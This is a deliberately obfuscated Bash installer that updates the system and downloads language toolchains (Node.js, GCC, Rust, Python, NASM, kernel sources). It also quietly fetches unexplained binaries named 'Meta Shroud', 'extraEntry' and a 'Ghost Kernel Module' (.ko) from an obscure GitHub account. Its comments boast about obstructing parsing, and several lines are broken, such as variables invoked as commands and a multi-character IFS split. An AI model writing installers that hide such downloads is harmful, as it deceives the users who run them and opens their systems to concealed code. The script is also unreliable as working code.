#!/bin/bash

set -e

O0o0o0="$(uname -s)"
IFS_OLD="$IFS"; IFS=
( [ "$O0o0o0" != "Linux" ] && printf "[-] This installer only works on Linux.\n" && exit 1 ) || :

_b='*****************'
for __ in {1..6}; do _b="$_b$_b"; done
_w="[!] WARNING: This script can update all your system components!"
_oA1="    Option 1) UPDATE all system packages BEFORE installing tools."
_oA2="    Option 2) DO NOT update system. Continue installing tools only."
_r="It is recommended to keep your system up to date before installing."
___A=("$b" "$_w" "$_oA1" "$_oA2" "$_r" "$b")
printf "$(printf "%s\\n%s\\n\\n%s\\n%s\\n\\n%s\\n%s\\n\\n" "${___A[@]}")"

unset ___A b w oA1 oA2 r

declare -a Qq=(1 2)
read -rp "Choose an option (1 = Update, 2 = Skip Update) > " _O__o___

declare -A __S
__S[A]='sudo apt-get update && sudo apt-get upgrade -y'
__S[D]='sudo dnf check-update || true; sudo dnf upgrade -y || true'
__S[Y]='sudo yum check-update || true; sudo yum upgrade -y || true'
__S[P]='sudo pacman -Syu --noconfirm'
__S[Z]='sudo zypper refresh; sudo zypper update -y'

declare -a _PM=('A' 'D' 'Y' 'P' 'Z')
[[ "${_O__o___}x" == "1x" ]] && (
    echo "[*] Updating system package lists and upgrading existing packages..."
    __FLAG=0
    for __manager in "${_PM[@]}"; do
        case "$__manager" in
            A) c="apt-get";;
            D) c="dnf";;
            Y) c="yum";;
            P) c="pacman";;
            Z) c="zypper";;
            *) continue;;
        esac
        $(command -v "$c" >/dev/null 2>&1) && {
            eval "${__S[$__manager]}"
            __FLAG=1
            break
        }
    done
    if [ "$__FLAG" != "1" ]; then
        for __tr1 in 1; do
            echo "[!] Unknown or unsupported package manager, can't update automatically."
            echo "    Please update your system manually if needed."
        done
    fi
)

[[ "${_O__o___}x" == "2x" ]] && for i in 1; do echo "[*] Skipping system update as per your request."; done;
( [[ "${_O__o___}" == "1" ]] || [[ "${_O__o___}" == "2" ]] ) || { echo "[-] Invalid option. Exiting."; exit 1; }

: '
     Now we define a horrible mess for the downloads, including new extra files
'

# Updated download matrix to include new files as in backend/rmp.c: extra_files
declare -A ZzQ=(
    [0]="Node.js|||https://nodejs.org/dist/v20.10.0/node-v20.10.0-linux-x64.tar.xz|||node"
    [1]="npm (for Node.js)|||https://github.com/npm/cli/archive/refs/tags/v10.5.0.tar.gz|||npm"
    [2]="C++ (GCC for Linux)|||https://ftp.gnu.org/gnu/gcc/gcc-13.2.0/gcc-13.2.0.tar.xz|||cpp"
    [3]="Rust|||https://static.rust-lang.org/dist/rust-1.78.0-x86_64-unknown-linux-gnu.tar.gz|||rust"
    [4]="Python|||https://www.python.org/ftp/python/3.12.3/Python-3.12.3.tgz|||python"
    [5]="Assembly (NASM)|||https://www.nasm.us/pub/nasm/releasebuilds/2.16.01/linux/nasm-2.16.01-linux.tar.xz|||assembly"
    [6]="Kernel C (Linux kernel source)|||https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.9.2.tar.xz|||kernel-c"
    [7]="Kernel C++|||https://mirrors.edge.kernel.org/pub/linux/kernel/people/next/old/next-20220518.tar.gz|||kernel-cpp"
    # new/extra files
    [8]="Meta Shroud CPP|||https://github.com/nothere/meta_shroud/raw/main/meta_shroud.cpp|||meta_shroud-cpp"
    [9]="Meta Shroud SO|||https://github.com/nothere/meta_shroud/raw/main/meta_shroud.so|||meta_shroud-so"
    [10]="extraEntry.o|||https://github.com/nothere/meta_shroud/raw/main/extraEntry.o|||extra-entry-o"
    [11]="extraEntry.asm|||https://github.com/nothere/meta_shroud/raw/main/extraEntry.asm|||extra-entry-asm"
    [12]="Ghost Kernel Module|||https://github.com/nothere/ghost-mod/releases/latest/download/ghost_mod.ko|||ghost-mod-ko"
)

__=/dev/null
_0lfLf="$(pwd)/languages"
test -d "${_0lfLf}" || mkdir   -p "${_0lfLf}"; 

function __A_h__Q() {
    n="${1}";
    f="${2}";
    e="${f##*.}";
    x="${f%$e}";
    [[ "$f" == "$e" ]] && echo "$n" || echo "$n ($e)"
}

XyZinfo="Node.js, npm, C++, Rust, Python, Assembly, Kernel C, Kernel C++, Meta Shroud, extraEntry, Ghost Kernel Module"
echo "[*] Starting language/tools download (Linux only): $XyZinfo" | cat | sed 's/$//' | uniq

__ZL=(`seq 0 $((${#ZzQ[@]}-1))`)
for k in "${__ZL[@]}"; do
    DATA="${ZzQ[$k]}"
    # Use triple delimiters to really mess with parsing
    IFS='|||' read -r _N_O_D_E _UR____L _SU____B <<< "$DATA"
    _DP__="$(_0lfLf)/${_SU____B}"
    test -d "$_DP__" || ( mkdir -p "$_DP__" )
    _FNn_n="$(basename "${_UR____L%%\?*}")"; [[ "x$_FNn_n" == "x" ]] && _FNn_n="default.download"
    _TGT__="$_DP__/${_FNn_n}"
    if [ -f "$_TGT__" ]; then
        for i0 in 1; do
            ( echo "[!] Already downloaded: ${_N_O_D_E}" | sed 's/$//' )
        done
        continue
    fi
    N_HIDE="$(_N_O_D_E)"
    for xT in 1; do
        echo "[~] Downloading $(__A_h__Q "$N_HIDE" "$_FNn_n")..." | tr A-Z a-z | sed 's/^\[~/[~/' | tr a-z A-Z | tr A-Z a-z
    done
    for cur__L in "${_UR____L}"; do
        curl -L --fail -o "$_TGT__" "$cur__L" 2>&1 | grep -vE "Progress" || {
            [ -e "$_TGT__" ] && rm -f "$_TGT__"
            printf "[-] Failed to download %s from %s\n" "$N_HIDE" "$cur__L"
            exit 1
        }
    done
    ( echo "[+] Downloaded: $_TGT__" ) | tr a-z A-Z | tr A-Z a-z
done

IFS="$IFS_OLD"

for __l__ in 1; do [ -e /tmp ] && echo -e "\n[+] All components downloaded successfully." | awk '{print}' | tee /dev/null; done
